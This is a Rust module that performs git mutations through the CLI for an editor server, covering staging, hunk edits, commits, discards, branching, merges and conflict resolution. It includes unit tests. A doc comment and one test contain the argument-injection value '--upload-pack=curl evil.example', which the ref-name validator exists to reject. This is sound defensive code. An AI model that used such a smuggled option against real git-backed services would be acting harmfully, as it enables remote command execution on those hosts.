//! Mutations, all through the `git` CLI (SPEC-005 §5.3).
//!
//! **The rule this module exists to enforce** (deep-dive 03 §1, TL;DR #1): read
//! with a library, write with the CLI. `git2` is not imported here, and that is
//! deliberate — the compiler is what keeps mutations off libgit2.
//!
//! Why the CLI and not `git2`:
//!
//! - **hooks**. libgit2 does not run `pre-commit`, `commit-msg` or `post-commit`.
//!   A user whose `pre-commit` formats code would silently get unformatted
//!   commits (§9 #5, C20).
//! - **config**. `core.autocrlf`, `commit.gpgsign`, `core.hooksPath`,
//!   `merge.conflictStyle` — the CLI honours all of them, libgit2 honours some.
//! - **merge**. Reimplementing git's merge strategies against libgit2 primitives
//!   is a project, not a function.
//!
//! Every function is `async` and returns the fresh [`GitStatus`] (§3.2,
//! [SPEC-005 INVENTED-6]): a mutation that does not tell the client what the
//! world now looks like forces a second round-trip, and in a multi-agent editor
//! the state can change in between.

use super::{GitCli, GitError, cli::CliOutput, relative_path, relative_paths, repo};

/// Stage or unstage paths (C16–C17).
///
/// `git add` cannot stage a deletion of a file that is already gone in some git
/// versions unless `--all` is passed, so this always uses `git add --all --` for
/// staging. Unstaging is `git restore --staged`, which is the modern spelling of
/// `git reset HEAD --` and, unlike `reset`, cannot accidentally move HEAD.
pub async fn stage(
    cli: &GitCli,
    paths: &[String],
    unstage: bool,
) -> Result<repo::GitStatus, GitError> {
    let paths = relative_paths(paths)?;
    if paths.is_empty() {
        return Err(GitError::Path("no paths given".into()));
    }

    let mut args: Vec<String> = if unstage {
        vec!["restore".into(), "--staged".into()]
    } else {
        vec!["add".into(), "--all".into()]
    };
    // `--` before the paths, always: a file literally named `--force` is not an
    // option, and a path starting with `-` must not become one.
    args.push("--".into());
    args.extend(paths);

    cli.checked(&args).await?;
    status(cli).await
}

/// Replace one index entry with caller-supplied text, leaving the worktree alone.
///
/// This is the mutation behind **Stage hunk**. The browser's CodeMirror merge view
/// produces the whole document the index should contain; `hash-object -w` writes
/// that blob and `update-index --cacheinfo` points only this path at it. No patch
/// text is synthesized, so newline markers and offset calculation cannot make a
/// partially-staged file fail as a unit ([SPEC-005 INVENTED-10]).
pub async fn stage_content(
    cli: &GitCli,
    rel: &str,
    content: &str,
) -> Result<repo::GitStatus, GitError> {
    let rel = relative_path(rel)?;
    guard_project_path(cli, &rel)?;
    let repo_rel = repo_relative_path(cli, &rel).await?;
    let mode = index_mode(cli, &rel).await?;
    let oid = cli
        .checked_with_stdin(&["hash-object", "-w", "--stdin"], content)
        .await?
        .trimmed()
        .to_string();

    cli.checked(&[
        "update-index",
        "--add",
        "--cacheinfo",
        &mode,
        &oid,
        &repo_rel,
    ])
    .await?;
    status(cli).await
}

/// Replace or remove one index entry without touching the worktree.
///
/// Used by **Unstage hunk**. `exists:false` means the selected hunk returns a newly
/// added file to the absent HEAD state; otherwise the supplied text becomes the
/// index entry, preserving the worktree's still-unstaged changes.
pub async fn unstage_content(
    cli: &GitCli,
    rel: &str,
    content: &str,
    exists: bool,
) -> Result<repo::GitStatus, GitError> {
    let rel = relative_path(rel)?;
    guard_project_path(cli, &rel)?;
    let repo_rel = repo_relative_path(cli, &rel).await?;
    if !exists {
        cli.checked(&["update-index", "--force-remove", "--", &repo_rel])
            .await?;
        return status(cli).await;
    }

    let mode = head_mode(cli, &rel).await?;
    let oid = cli
        .checked_with_stdin(&["hash-object", "-w", "--stdin"], content)
        .await?
        .trimmed()
        .to_string();
    cli.checked(&[
        "update-index",
        "--add",
        "--cacheinfo",
        &mode,
        &oid,
        &repo_rel,
    ])
    .await?;
    status(cli).await
}

/// Write a partially-reverted worktree document atomically, leaving the index alone.
///
/// Used by **Discard hunk**. Unlike whole-file discard this never runs `git restore`:
/// CodeMirror has already removed exactly one chunk from `content`, and replacing
/// the worktree file is the only mutation needed.
pub async fn discard_content(
    cli: &GitCli,
    rel: &str,
    content: &str,
    expected_oid: &str,
) -> Result<repo::GitStatus, GitError> {
    let rel = relative_path(rel)?;
    guard_project_path(cli, &rel)?;
    let expected_oid = parse_blob_oid(expected_oid)?;
    let root = cli.root().to_path_buf();
    let write_rel = rel.clone();
    let write_content = content.to_string();
    tokio::task::spawn_blocking(move || {
        let path = crate::files::resolve_non_root(&root, &write_rel)?;
        let current = std::fs::read(&path)
            .map_err(|_| crate::files::FileError::NotFound(write_rel.clone()))?;
        let current_oid = repo::blob_oid(&current)
            .map_err(|error| crate::files::FileError::Conflict(error.to_string()))?;
        if current_oid != expected_oid {
            return Err(crate::files::FileError::Conflict(
                "file changed after the diff was loaded; refresh before discarding a hunk".into(),
            ));
        }
        crate::files::write(&root, &write_rel, &write_content, None)
    })
    .await
    .map_err(|e| GitError::Blocked(format!("worktree write task failed: {e}")))?
    .map_err(file_error)?;
    status(cli).await
}

fn guard_project_path(cli: &GitCli, rel: &str) -> Result<(), GitError> {
    crate::files::resolve_non_root(cli.root(), rel)
        .map(|_| ())
        .map_err(|error| match error {
            crate::files::PathError::Escapes => {
                GitError::Forbidden("path resolves outside the project root".into())
            }
            other => GitError::Path(other.to_string()),
        })
}

fn parse_blob_oid(oid: &str) -> Result<String, GitError> {
    let oid = oid.trim();
    if oid.len() == 40 && oid.bytes().all(|byte| byte.is_ascii_hexdigit()) {
        return Ok(oid.to_ascii_lowercase());
    }
    Err(GitError::Path(
        "expectedOid must be a 40-character Git object id".into(),
    ))
}

/// Convert a project-relative path into the repository-relative spelling expected
/// by index plumbing. Porcelain commands run from `cli.root()` and interpret paths
/// relative to that directory, while `update-index --cacheinfo` always addresses the
/// repository index directly.
async fn repo_relative_path(cli: &GitCli, rel: &str) -> Result<String, GitError> {
    let top = cli.checked(&["rev-parse", "--show-toplevel"]).await?;
    let top = std::path::PathBuf::from(top.trimmed()).canonicalize()?;
    let root = cli.root().canonicalize()?;
    let prefix = root
        .strip_prefix(&top)
        .map_err(|_| GitError::Path("project root is outside repository worktree".into()))?;
    let path = if prefix.as_os_str().is_empty() {
        std::path::PathBuf::from(rel)
    } else {
        prefix.join(rel)
    };
    Ok(path.to_string_lossy().replace('\\', "/"))
}

/// The current index mode, or the worktree mode for a new file.
async fn index_mode(cli: &GitCli, rel: &str) -> Result<String, GitError> {
    let output = cli.run(&["ls-files", "-s", "--", rel]).await?;
    if output.ok()
        && let Some(mode) = output.trimmed().split_whitespace().next()
    {
        return Ok(mode.to_string());
    }

    let meta = tokio::fs::metadata(super::join_root(cli.root(), rel)).await?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        if meta.permissions().mode() & 0o111 != 0 {
            return Ok("100755".into());
        }
    }
    Ok("100644".into())
}

/// The HEAD mode for a tracked path being partially unstaged.
async fn head_mode(cli: &GitCli, rel: &str) -> Result<String, GitError> {
    let output = cli.checked(&["ls-tree", "HEAD", "--", rel]).await?;
    output
        .trimmed()
        .split_whitespace()
        .next()
        .map(str::to_string)
        .ok_or_else(|| GitError::NotFound(format!("{rel} does not exist at HEAD")))
}

fn file_error(error: crate::files::FileError) -> GitError {
    match error {
        crate::files::FileError::Path(e) => GitError::Path(e.to_string()),
        crate::files::FileError::NotFound(path) => GitError::NotFound(path),
        crate::files::FileError::Conflict(detail) => GitError::Blocked(detail),
        crate::files::FileError::NotADirectory(detail) => GitError::Path(detail),
        crate::files::FileError::Io(error) => GitError::Io(error),
    }
}

/// Commit the index (C18–C21).
///
/// The message goes through `--file -` on stdin rather than `-m`: a message can
/// contain anything, including a leading `-`, and stdin has no length limit or
/// quoting rules to get wrong.
pub async fn commit(cli: &GitCli, message: &str, amend: bool) -> Result<repo::GitStatus, GitError> {
    let message = message.trim();
    if message.is_empty() {
        return Err(GitError::Blocked("commit message is required".into()));
    }

    let mut args: Vec<String> = vec!["commit".into(), "--file".into(), "-".into()];
    if amend {
        args.push("--amend".into());
    }

    // No `--allow-empty`: git's own refusal is the check ([SPEC-005 INVENTED] §1,
    // C19), and `classify` turns it into `NothingToCommit`. Adding the flag here
    // would make the API able to create empty commits the CLI would reject.
    let output = cli.run_with_stdin(&args, message).await?;
    if !output.ok() {
        return Err(super::cli::classify(&output));
    }
    status(cli).await
}

/// Throw away changes (C22–C23, [SPEC-005 INVENTED-2]).
///
/// `git restore --source=HEAD --staged --worktree` resets both the index and the
/// file, which is what "discard" means to a user looking at the panel.
///
/// Untracked files are **refused**, not deleted. `git restore` cannot touch them
/// anyway, and the destructive alternative (`git clean -f`) deletes work that
/// exists nowhere else — no reflog, no stash, nothing to recover from. Deleting an
/// untracked file is the file API's job, where the user is asking for exactly that.
pub async fn discard(cli: &GitCli, paths: &[String]) -> Result<repo::GitStatus, GitError> {
    let paths = relative_paths(paths)?;
    if paths.is_empty() {
        return Err(GitError::Path("no paths given".into()));
    }

    // Ask the status we already know how to compute which of these are untracked.
    let before = status(cli).await?;
    let untracked: Vec<&str> = paths
        .iter()
        .filter(|p| {
            before
                .entries
                .iter()
                .any(|e| &e.path == *p && e.worktree == "new" && e.index == "none")
        })
        .map(String::as_str)
        .collect();
    if !untracked.is_empty() {
        return Err(GitError::Blocked(format!(
            "cannot discard untracked files (nothing to restore them from): {}",
            untracked.join(", ")
        )));
    }

    let mut args: Vec<String> = vec![
        "restore".into(),
        "--source=HEAD".into(),
        "--staged".into(),
        "--worktree".into(),
        "--".into(),
    ];
    args.extend(paths);

    cli.checked(&args).await?;
    status(cli).await
}

/// Create a branch, optionally switching to it (C24).
pub async fn branch(
    cli: &GitCli,
    name: &str,
    start_point: Option<&str>,
    checkout: bool,
) -> Result<repo::GitStatus, GitError> {
    let name = validate_ref_name(name)?;

    let mut args: Vec<String> = if checkout {
        vec!["checkout".into(), "-b".into(), name]
    } else {
        vec!["branch".into(), name]
    };
    if let Some(start) = start_point {
        args.push(validate_ref_name(start)?);
    }

    cli.checked(&args).await?;
    status(cli).await
}

/// Switch branches (C25–C26, [SPEC-005 INVENTED-11]).
///
/// Blocked while the worktree is dirty unless `force`. Plain `git checkout`
/// happily carries non-conflicting local changes across branches, which is
/// convenient alone and wrong here: with agents writing files concurrently, a
/// silent carry-over means edits meant for one branch land on another.
pub async fn checkout(
    cli: &GitCli,
    target: &str,
    force: bool,
) -> Result<repo::GitStatus, GitError> {
    let target = validate_ref_name(target)?;

    if !force {
        let before = status(cli).await?;
        // Untracked files are not carried anywhere by a checkout, so they do not
        // count as dirty — only staged and modified tracked files do.
        let dirty = before.counts.staged + before.counts.changed + before.counts.conflicted;
        if dirty > 0 {
            return Err(GitError::Blocked(format!(
                "{dirty} uncommitted change(s) — commit, discard, or use force"
            )));
        }
    }

    let mut args: Vec<String> = vec!["checkout".into()];
    if force {
        args.push("--force".into());
    }
    args.push(target);

    cli.checked(&args).await?;
    status(cli).await
}

/// Merge a ref into the current branch (C27–C29).
///
/// A conflicting merge is **not** an error the caller has to undo: git leaves the
/// index in the conflicted state on purpose, and that state is what the 3-way
/// editor reads. So a `CONFLICT` exit still returns Ok with the new status, and
/// the client sees `state: "merge"` plus conflicted entries.
pub async fn merge(cli: &GitCli, from: &str, no_ff: bool) -> Result<repo::GitStatus, GitError> {
    let from = validate_ref_name(from)?;

    let mut args: Vec<String> = vec!["merge".into()];
    if no_ff {
        args.push("--no-ff".into());
    }
    // Never open an editor: `--no-edit` takes git's generated merge message.
    args.push("--no-edit".into());
    args.push(from);

    let output = cli.run(&args).await?;
    if !output.ok() && !is_conflict(&output) {
        return Err(super::cli::classify(&output));
    }
    // Exit code 0 covers both "merged" and "there was nothing to merge", and the
    // difference matters: reporting the second as a merge would have the UI announce
    // work that never happened (§9 #9). `LC_ALL=C` in `GitCli` is what makes
    // matching the English message safe.
    if output.ok() && is_up_to_date(&output) {
        return Err(GitError::UpToDate);
    }
    status(cli).await
}

/// Did `git merge` decide the ref was already an ancestor?
fn is_up_to_date(output: &CliOutput) -> bool {
    output
        .combined()
        .to_ascii_lowercase()
        .contains("already up to date")
}

/// Did this `git merge` fail because of conflicts, as opposed to failing outright?
///
/// The marker is on **stdout** for `merge`, which is why `combined()` exists.
fn is_conflict(output: &CliOutput) -> bool {
    let text = output.combined().to_ascii_lowercase();
    text.contains("conflict (") || text.contains("automatic merge failed")
}

/// Record a resolved file (C31, [SPEC-005 INVENTED-12]).
///
/// Writes the resolved content, then `git add` to collapse the conflict stages.
/// The server never picks a side itself: choosing between "ours" and "theirs" is a
/// judgement about the code, and guessing it is how you lose work silently.
pub async fn resolve(cli: &GitCli, rel: &str, content: &str) -> Result<repo::GitStatus, GitError> {
    let rel = relative_path(rel)?;
    // `rel` is already validated by `relative_path`, so the join cannot escape.
    let target = super::join_root(cli.root(), &rel);

    if let Some(parent) = target.parent() {
        tokio::fs::create_dir_all(parent).await?;
    }
    tokio::fs::write(&target, content).await?;

    cli.checked(&["add", "--", &rel]).await?;
    status(cli).await
}

/// Abort a merge in progress, returning to the pre-merge state (C29).
pub async fn merge_abort(cli: &GitCli) -> Result<repo::GitStatus, GitError> {
    cli.checked(&["merge", "--abort"]).await?;
    status(cli).await
}

/// Read the status off the blocking pool — every mutation ends with this.
async fn status(cli: &GitCli) -> Result<repo::GitStatus, GitError> {
    let root = cli.root().to_path_buf();
    // `git2` handles are `!Send`, so the repository is opened and dropped entirely
    // inside this closure (deep-dive 03 §4 #1).
    tokio::task::spawn_blocking(move || repo::status(&root))
        .await
        .map_err(|e| GitError::Blocked(format!("status task failed: {e}")))?
}

/// Reject ref names that git itself would reject, plus anything option-shaped.
///
/// The leading-`-` check is the security-relevant one: a "branch name" of
/// `--upload-pack=curl evil.example` would otherwise become an argument to git.
/// `--` cannot save a ref position, so the name is validated instead (§5.4).
fn validate_ref_name(name: &str) -> Result<String, GitError> {
    let name = name.trim();
    if name.is_empty() {
        return Err(GitError::Path("ref name is required".into()));
    }
    if name.starts_with('-') {
        return Err(GitError::Path(format!(
            "ref name must not start with '-': {name}"
        )));
    }
    // git's own rules (`git check-ref-format`), the subset that matters here.
    const FORBIDDEN: [&str; 6] = ["..", "@{", "//", "\\", " ", "~"];
    for pattern in FORBIDDEN {
        if name.contains(pattern) {
            return Err(GitError::Path(format!(
                "invalid ref name (contains {pattern:?}): {name}"
            )));
        }
    }
    if name
        .chars()
        .any(|c| c.is_control() || matches!(c, '^' | ':' | '?' | '*' | '['))
    {
        return Err(GitError::Path(format!("invalid ref name: {name}")));
    }
    if name.ends_with('.') || name.ends_with(".lock") || name.ends_with('/') {
        return Err(GitError::Path(format!("invalid ref name: {name}")));
    }
    Ok(name.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ref_names_that_are_actually_used_are_accepted() {
        for name in [
            "main",
            "feature/spec-005",
            "release-1.2.3",
            "origin/main",
            "HEAD",
            "user/Ünïcödé",
        ] {
            assert!(validate_ref_name(name).is_ok(), "should accept {name}");
        }
        // Surrounding whitespace is trimmed, not rejected — a name pasted from a
        // terminal often carries it.
        assert_eq!(validate_ref_name("  main \n").unwrap(), "main");
    }

    #[test]
    fn option_shaped_ref_names_are_rejected() {
        // The one that matters: git would read this as a flag, not a branch, and
        // `--` does not protect a ref position.
        assert!(validate_ref_name("--upload-pack=curl evil.example").is_err());
        assert!(validate_ref_name("-f").is_err());
        assert!(validate_ref_name("--force").is_err());
    }

    #[test]
    fn ref_names_git_itself_rejects_are_rejected() {
        for bad in [
            "",
            "   ",
            "a..b",
            "a@{0}",
            "a//b",
            "a\\b",
            "has space",
            "til~de",
            "car^et",
            "co:lon",
            "qu?estion",
            "sta*r",
            "brac[ket",
            "trailing.",
            "branch.lock",
            "trailing/",
            "ctrl\u{7}char",
        ] {
            assert!(validate_ref_name(bad).is_err(), "should reject {bad:?}");
        }
    }

    #[test]
    fn conflict_detection_reads_both_streams() {
        // `git merge` puts this on stdout, which is the whole reason `combined()`
        // exists (§9 #7).
        let on_stdout = CliOutput {
            code: 1,
            stdout: "Auto-merging a.txt\nCONFLICT (content): Merge conflict in a.txt\n".into(),
            stderr: String::new(),
        };
        assert!(is_conflict(&on_stdout));

        let on_stderr = CliOutput {
            code: 1,
            stdout: String::new(),
            stderr: "Automatic merge failed; fix conflicts and then commit.\n".into(),
        };
        assert!(is_conflict(&on_stderr));

        // A genuine failure must not be mistaken for a conflict, or the caller
        // would report success on a merge that never started.
        let real_failure = CliOutput {
            code: 1,
            stdout: String::new(),
            stderr: "merge: nope - not something we can merge\n".into(),
        };
        assert!(!is_conflict(&real_failure));
    }

    #[test]
    fn a_no_op_merge_is_told_apart_from_a_real_one() {
        // Both exit 0, so the message is the only signal there is.
        let nothing_to_do = CliOutput {
            code: 0,
            stdout: "Already up to date.\n".into(),
            stderr: String::new(),
        };
        assert!(is_up_to_date(&nothing_to_do));

        let real_merge = CliOutput {
            code: 0,
            stdout: "Updating c660b20..1d8e117\nFast-forward\n a.txt | 2 +-\n".into(),
            stderr: String::new(),
        };
        assert!(!is_up_to_date(&real_merge));
    }
}
